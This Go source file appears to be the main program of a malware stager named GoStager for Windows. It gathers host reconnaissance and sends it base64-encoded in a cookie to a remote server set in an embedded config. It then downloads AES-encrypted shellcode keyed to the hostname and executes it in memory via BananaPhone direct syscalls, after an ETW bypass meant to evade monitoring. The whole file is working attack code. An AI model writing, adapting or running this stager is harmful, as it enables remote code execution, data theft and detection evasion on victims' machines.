package main

import (
	"GoStager/cmd/cryptoUtil"
	"GoStager/cmd/malwareUtil"
	"GoStager/cmd/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

//go:embed conf.txt
var t string
var (
	body       []byte
	initChecks util.InitialChecks
)

// example of using bananaphone to execute shellcode in the current thread.
// https://github.com/C-Sto/BananaPhone

func main() {
	//get the shellcode by http
	conf := strings.Split(t, ",")
	//initial recon
	host := malwareUtil.Recon()
	initChecks, _ = util.UnmarshalJSON(host)
	cookie := b64.StdEncoding.EncodeToString(host)
	//initial request
	body = request(cookie, conf)
	//if the response is not a shellcode, sleep and try again
	for {
		if len(body) > 10 {
			break
		}
		t, _ := strconv.Atoi(string(body))
		sleep(t)
		body = request("", conf)
	}
	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
	shellcode, _ := hex.DecodeString(string(hexSc))
	//inject the shellcode
	inject(shellcode)
}

func sleep(t int) {
	time.Sleep(time.Duration(t) * time.Second)
}

func request(cookie string, conf []string) []byte {
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, _ := http.NewRequest("GET", conf[0], nil)
	req.Header.Add("User-Agent", conf[1])
	if cookie != "" {
		req.Header.Add("Cookie", cookie)
	}
	resp, _ := c.Do(req)
	body, _ = ioutil.ReadAll(resp.Body)
	fmt.Println(string(body))
	return body
}

func inject(shellcode []byte) {
	//from https://github.com/C-Sto/BananaPhone/blob/master/example/calcshellcode/main.go
	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	alloc, _ := bp.GetSysID("NtAllocateVirtualMemory")
	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
	createthread, _ := bp.GetSysID("NtCreateThreadEx")

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
	malwareUtil.Etw(handle) //etw bypass
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		windows.PAGE_READWRITE,
	)
	sleep(5)
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)
	sleep(5)
	var oldprotect uintptr
	bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	sleep(5)
	var hhosthread uintptr
	bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	sleep(5)
	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
}
